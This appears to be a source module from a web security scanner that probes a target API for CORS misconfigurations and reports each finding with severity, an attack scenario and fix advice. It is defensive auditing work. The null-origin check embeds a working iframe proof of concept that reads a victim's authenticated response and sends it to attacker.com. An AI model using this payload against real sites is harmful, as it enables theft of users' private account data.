/**
 * CORS misconfiguration audit module.
 *
 * CORS bugs are consistently in the top-10 payouts on bug bounty platforms because
 * they look benign to developers ("it's just a header") but let any attacker-controlled
 * origin silently exfiltrate authenticated data via a victim's browser.
 *
 * Test cases (each with a concrete attack scenario):
 *
 *  1. Origin reflection          — server echoes back any Origin header in ACAO → any origin
 *                                   can make credentialed cross-origin requests
 *  2. Null origin + credentials  — ACAO: null + ACAC: true → sandboxed iframes / data: URIs
 *                                   can exfiltrate cookies
 *  3. Wildcard + credentials     — ACAO: * + ACAC: true (invalid per spec but some servers
 *                                   accept it on non-preflight) → full exfil
 *  4. Subdomain bypass           — attacker.target.com accepted if server only checks suffix →
 *                                   any subdomain takeover becomes full CORS bypass
 *  5. Regex anchor bypass        — evilorigin.com accepts endsWith(targetdomain.com) →
 *                                   evilexample.targetdomain.com passes
 *  6. HTTP downgrade             — https target reflects http:// origin → cookie stealing
 *                                   on same-site HTTP MitM paths
 *  7. Preflight not enforced     — OPTIONS returns wildcard but GET/POST differ →
 *                                   simple requests (no preflight) are always allowed
 *  8. Trusted internal origins   — corp.internal / localhost / 127.0.0.1 reflected →
 *                                   on SSRF + CORS chain it becomes exfil
 */

import { request } from "undici";
import { buildAuthHeaders } from "../auth-headers.js";
import type { SecurityAuthProfile } from "../types.js";

export type CorsFinding = {
  type: "dynamic";
  severity: "info" | "low" | "medium" | "high" | "critical";
  title: string;
  description?: string;
  location?: string;
  tool?: string;
  evidence?: Record<string, unknown>;
  suggestion?: string;
  status?: string;
};

// ── HTTP probe helper ─────────────────────────────────────────────────────────

type CorsProbeResult = {
  status: number;
  acao: string | null;   // Access-Control-Allow-Origin
  acac: string | null;   // Access-Control-Allow-Credentials
  acah: string | null;   // Access-Control-Allow-Headers
  acam: string | null;   // Access-Control-Allow-Methods
} | null;

async function corsProbe(
  url: string,
  origin: string,
  method = "GET",
  authHeaders: Record<string, string> = {},
  timeoutMs = 10_000,
): Promise<CorsProbeResult> {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const res = await request(url, {
      method,
      headers: {
        Origin: origin,
        Accept: "application/json",
        "User-Agent": "Mozilla/5.0 (compatible; security-scanner)",
        ...authHeaders,
      },
      signal: ctrl.signal as any,
    });
    await res.body.text().catch(() => ""); // drain
    const h = res.headers as Record<string, string | string[] | undefined>;
    const first = (k: string) => {
      const v = h[k];
      return Array.isArray(v) ? v[0] : v ?? null;
    };
    return {
      status: res.statusCode,
      acao: first("access-control-allow-origin"),
      acac: first("access-control-allow-credentials"),
      acah: first("access-control-allow-headers"),
      acam: first("access-control-allow-methods"),
    };
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

// ── Candidate endpoints to test ───────────────────────────────────────────────

const API_PATHS_TO_CHECK = [
  "/api/user", "/api/me", "/api/profile", "/api/account",
  "/api/v1/user", "/api/v1/me", "/api/v1/account",
  "/graphql",
  "/api/transactions", "/api/transfers", "/api/payments",
  "/api/settings", "/api/preferences",
];

async function findCorsEndpoint(base: string, authHeaders: Record<string, string>): Promise<string[]> {
  const live: string[] = [];
  const baseline = `${base}/nonexistent-cors-check-${Math.floor(Math.random() * 999999)}`;
  const candidates = [base, ...API_PATHS_TO_CHECK.map((p) => `${base}${p}`)];

  await Promise.all(
    candidates.map(async (url) => {
      const res = await corsProbe(url, "https://example.com", "GET", authHeaders, 6_000);
      // We care even about 401/403 — CORS headers are set before auth on many stacks
      if (res && res.status !== 404 && url !== baseline) live.push(url);
    })
  );
  return live.length ? live : [base];
}

// ── Individual checks ─────────────────────────────────────────────────────────

async function checkOriginReflection(
  url: string,
  authHeaders: Record<string, string>,
): Promise<CorsFinding | null> {
  const attackerOrigin = "https://evil-attacker.com";
  const res = await corsProbe(url, attackerOrigin, "GET", authHeaders);
  if (!res) return null;

  if (res.acao === attackerOrigin) {
    const withCredentials = res.acac?.toLowerCase() === "true";
    return {
      type: "dynamic",
      severity: withCredentials ? "critical" : "high",
      title: `CORS: origin reflection${withCredentials ? " with credentials" : ""} at ${url}`,
      description:
        `The server reflected the attacker-controlled origin "https://evil-attacker.com" verbatim ` +
        `in Access-Control-Allow-Origin${withCredentials ? " and also set Access-Control-Allow-Credentials: true" : ""}. ` +
        (withCredentials
          ? `With both headers set, any malicious website can silently make credentialed requests to ${url} ` +
            `from a victim's browser, reading the response body including cookies, tokens, and account data.`
          : `Without the Credentials header this allows cross-origin reads of non-credentialed responses. ` +
            `If session tokens are transported via cookies or Authorization headers from JavaScript, ` +
            `an attacker can still mount a targeted attack from a controlled iframe.`),
      location: url,
      tool: "cors-audit",
      evidence: {
        vulnerabilityClass: "broken_access_control",
        owaspCategory: "A01:2021 Broken Access Control",
        testedOrigin: attackerOrigin,
        acao: res.acao,
        acac: res.acac,
        responseStatus: res.status,
        attackScenario: withCredentials
          ? "Victim visits evil-attacker.com → page runs fetch(target, {credentials:'include'}) → reads authenticated response"
          : "Victim visits evil-attacker.com → page reads unauthenticated response from target",
      },
      suggestion:
        "Maintain an explicit server-side allowlist of trusted origins. Compare the request Origin " +
        "against the allowlist; only reflect/echo if it matches — never use a dynamic reflect-all pattern. " +
        "Do NOT set Access-Control-Allow-Credentials: true unless absolutely necessary, and never combine " +
        "it with a dynamic allow-origin or a wildcard.",
      status: "open",
    };
  }
  return null;
}

async function checkNullOrigin(
  url: string,
  authHeaders: Record<string, string>,
): Promise<CorsFinding | null> {
  const res = await corsProbe(url, "null", "GET", authHeaders);
  if (!res) return null;

  const acaoIsNull = res.acao === "null";
  const hasCredentials = res.acac?.toLowerCase() === "true";

  if (acaoIsNull) {
    return {
      type: "dynamic",
      severity: hasCredentials ? "critical" : "high",
      title: `CORS: null origin accepted${hasCredentials ? " with credentials" : ""} at ${url}`,
      description:
        `The server returned "Access-Control-Allow-Origin: null"` +
        (hasCredentials ? ` along with "Access-Control-Allow-Credentials: true"` : "") +
        `. Browsers send the Origin: null header for requests made from sandboxed iframes, ` +
        `data: URIs, and file:// pages. An attacker can host a sandboxed iframe on any domain ` +
        `to make credentialed requests to ${url} and read the response.`,
      location: url,
      tool: "cors-audit",
      evidence: {
        vulnerabilityClass: "broken_access_control",
        owaspCategory: "A01:2021 Broken Access Control",
        testedOrigin: "null",
        acao: res.acao,
        acac: res.acac,
        responseStatus: res.status,
        attackPoC: `<iframe sandbox="allow-scripts" srcdoc='<script>fetch("${url}",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://attacker.com?d="+encodeURIComponent(d)))</script>'></iframe>`,
      },
      suggestion:
        'Remove "null" from allowed origins. Sandboxed iframes from legitimate origins should use ' +
        'allow-same-origin in their sandbox attribute if they need to share the parent origin. ' +
        'Otherwise treat "null" origin requests the same as anonymous requests.',
      status: "open",
    };
  }
  return null;
}

async function checkWildcardWithCredentials(
  url: string,
  authHeaders: Record<string, string>,
): Promise<CorsFinding | null> {
  const res = await corsProbe(url, "https://example.com", "GET", authHeaders);
  if (!res) return null;

  if (res.acao === "*" && res.acac?.toLowerCase() === "true") {
    return {
      type: "dynamic",
      severity: "critical",
      title: `CORS: wildcard ACAO with credentials at ${url}`,
      description:
        `Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true is ` +
        `rejected by browsers per spec, but some older browsers and non-browser clients (cURL, Postman, ` +
        `mobile apps) accept it. More importantly, it indicates the server-side CORS policy is ` +
        `fundamentally broken — it will likely also reflect arbitrary origins with credentials ` +
        `when origin-specific requests are made (see origin reflection check).`,
      location: url,
      tool: "cors-audit",
      evidence: {
        vulnerabilityClass: "broken_access_control",
        owaspCategory: "A01:2021 Broken Access Control",
        acao: res.acao,
        acac: res.acac,
        responseStatus: res.status,
      },
      suggestion:
        "Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. " +
        "If credentials are needed, use an explicit allowlist. If wide-open CORS is needed (public API), " +
        "never set Access-Control-Allow-Credentials: true.",
      status: "open",
    };
  }
  return null;
}

async function checkSubdomainBypass(
  url: string,
  parsedBase: URL,
  authHeaders: Record<string, string>,
): Promise<CorsFinding | null> {
  // Test if the server accepts any subdomain of the target
  const attackSubdomain = `https://evil.${parsedBase.hostname}`;
  const res = await corsProbe(url, attackSubdomain, "GET", authHeaders);
  if (!res) return null;

  if (res.acao === attackSubdomain) {
    const withCredentials = res.acac?.toLowerCase() === "true";
    return {
      type: "dynamic",
      severity: withCredentials ? "critical" : "high",
      title: `CORS: arbitrary subdomain accepted${withCredentials ? " with credentials" : ""} at ${url}`,
      description:
        `The server accepted "https://evil.${parsedBase.hostname}" as a trusted CORS origin. ` +
        `This suggests the origin check uses an endsWith or suffix-match pattern rather than an ` +
        `exact allowlist. Any existing or future subdomain takeover converts immediately to a ` +
        `full CORS bypass and authenticated data exfiltration.`,
      location: url,
      tool: "cors-audit",
      evidence: {
        vulnerabilityClass: "broken_access_control",
        owaspCategory: "A01:2021 Broken Access Control",
        testedOrigin: attackSubdomain,
        acao: res.acao,
        acac: res.acac,
        responseStatus: res.status,
      },
      suggestion:
        "Use exact string matching against a hardcoded allowlist of origins. Never use a suffix/includes " +
        "check like `origin.endsWith('.yourdomain.com')` — always match the full origin string including " +
        "the scheme, subdomain, and port.",
      status: "open",
    };
  }
  return null;
}

async function checkRegexAnchorBypass(
  url: string,
  parsedBase: URL,
  authHeaders: Record<string, string>,
): Promise<CorsFinding | null> {
  // e.g. evilexample.targetdomain.com passes startsWith check on "targetdomain.com"
  const domain = parsedBase.hostname;
  const attackOrigin = `https://evil${domain}`;
  const res = await corsProbe(url, attackOrigin, "GET", authHeaders);
  if (!res) return null;

  if (res.acao === attackOrigin) {
    const withCredentials = res.acac?.toLowerCase() === "true";
    return {
      type: "dynamic",
      severity: withCredentials ? "critical" : "high",
      title: `CORS: regex anchor bypass accepted at ${url}`,
      description:
        `The server accepted "https://evil${domain}" as a trusted origin. This indicates ` +
        `the regex used to validate the Origin header is missing the start anchor (^), ` +
        `allowing an attacker to register evil${domain} and exploit the missing anchor. ` +
        `Even if the subdomain is not currently registered, the CORS policy is broken.`,
      location: url,
      tool: "cors-audit",
      evidence: {
        vulnerabilityClass: "broken_access_control",
        owaspCategory: "A01:2021 Broken Access Control",
        testedOrigin: attackOrigin,
        acao: res.acao,
        acac: res.acac,
        responseStatus: res.status,
      },
      suggestion:
        "Anchor all CORS origin regex patterns with ^ and $. Better yet, avoid regex entirely " +
        "and use an exact-match allowlist: Set<string> with origin in allowedOrigins.",
      status: "open",
    };
  }
  return null;
}

async function checkHttpDowngrade(
  url: string,
  parsedBase: URL,
  authHeaders: Record<string, string>,
): Promise<CorsFinding | null> {
  const httpOrigin = `http://${parsedBase.hostname}`;
  const res = await corsProbe(url, httpOrigin, "GET", authHeaders);
  if (!res) return null;

  if (res.acao === httpOrigin && parsedBase.protocol === "https:") {
    const withCredentials = res.acac?.toLowerCase() === "true";
    return {
      type: "dynamic",
      severity: withCredentials ? "high" : "medium",
      title: `CORS: HTTP downgrade origin accepted by HTTPS target at ${url}`,
      description:
        `The HTTPS target at ${url} accepts the downgraded HTTP origin "http://${parsedBase.hostname}". ` +
        `An attacker on the same network (hotel WiFi, coffee shop) can intercept HTTP traffic to ` +
        `the same hostname and inject a page that makes credentialed cross-origin requests to the ` +
        `HTTPS API, bypassing HTTPS protections via the looser CORS policy.`,
      location: url,
      tool: "cors-audit",
      evidence: {
        vulnerabilityClass: "broken_access_control",
        owaspCategory: "A01:2021 Broken Access Control",
        testedOrigin: httpOrigin,
        acao: res.acao,
        acac: res.acac,
        responseStatus: res.status,
      },
      suggestion:
        "CORS allowlists should only contain HTTPS origins for HTTPS APIs. Never allow HTTP origins " +
        "to make credentialed requests to HTTPS endpoints. This prevents same-site MitM attacks.",
      status: "open",
    };
  }
  return null;
}

async function checkInternalOrigins(
  url: string,
  authHeaders: Record<string, string>,
): Promise<CorsFinding[]> {
  const internalOrigins = [
    "http://localhost",
    "http://localhost:3000",
    "http://127.0.0.1",
    "http://127.0.0.1:8080",
    "http://192.168.1.1",
    "https://internal.corp",
    "https://corp.internal",
  ];

  const findings: CorsFinding[] = [];
  for (const origin of internalOrigins) {
    const res = await corsProbe(url, origin, "GET", authHeaders, 5_000);
    if (!res) continue;

    if (res.acao === origin) {
      const withCredentials = res.acac?.toLowerCase() === "true";
      findings.push({
        type: "dynamic",
        severity: withCredentials ? "medium" : "low",
        title: `CORS: internal/localhost origin accepted at ${url}`,
        description:
          `The server accepted "${origin}" as a trusted CORS origin. In production, this origin ` +
          `should not appear in the CORS allowlist. If the server is also reachable from an SSRF vector, ` +
          `this becomes a chain: SSRF → localhost page → CORS read → data exfiltration.`,
        location: url,
        tool: "cors-audit",
        evidence: {
          vulnerabilityClass: "broken_access_control",
          owaspCategory: "A01:2021 Broken Access Control",
          testedOrigin: origin,
          acao: res.acao,
          acac: res.acac,
          responseStatus: res.status,
        },
        suggestion:
          "Remove localhost, 127.0.0.1, and internal/corp origins from the CORS allowlist in production " +
          "deployments. These should only appear in local development configurations.",
        status: "open",
      });
      break; // one internal-origin finding is enough
    }
  }
  return findings;
}

// ── Main entrypoint ──────────────────────────────────────────────────────────

export async function runCorsAudit(
  baseUrl: string,
  authProfiles: SecurityAuthProfile[],
): Promise<CorsFinding[]> {
  const findings: CorsFinding[] = [];
  const base = baseUrl.replace(/\/+$/, "");
  const parsedBase = new URL(base);
  const primaryProfile = authProfiles[0];
  const authHeaders = buildAuthHeaders(primaryProfile);

  // Discover live API endpoints to probe
  const endpoints = await findCorsEndpoint(base, authHeaders);

  for (const url of endpoints.slice(0, 8)) {
    const [reflection, nullOrigin, wildcard, subdomain, regexAnchor, httpDowngrade, internal] =
      await Promise.all([
        checkOriginReflection(url, authHeaders),
        checkNullOrigin(url, authHeaders),
        checkWildcardWithCredentials(url, authHeaders),
        checkSubdomainBypass(url, parsedBase, authHeaders),
        checkRegexAnchorBypass(url, parsedBase, authHeaders),
        checkHttpDowngrade(url, parsedBase, authHeaders),
        checkInternalOrigins(url, authHeaders),
      ]);

    if (reflection) findings.push(reflection);
    if (nullOrigin) findings.push(nullOrigin);
    if (wildcard) findings.push(wildcard);
    if (subdomain) findings.push(subdomain);
    if (regexAnchor) findings.push(regexAnchor);
    if (httpDowngrade) findings.push(httpDowngrade);
    findings.push(...internal);
  }

  if (!findings.length) {
    findings.push({
      type: "dynamic",
      severity: "info",
      title: "CORS audit: no misconfigurations detected",
      description:
        `${endpoints.length} endpoint(s) tested against 7 CORS attack patterns. ` +
        `All endpoints either returned no CORS headers or validated origins correctly. ` +
        `Note: CORS bugs in custom internal paths not probed here require an OpenAPI spec import ` +
        `or manual path enumeration.`,
      location: base,
      tool: "cors-audit",
      evidence: { endpointsTested: endpoints.length, patternsChecked: 7 },
      status: "open",
    });
  }

  return findings;
}
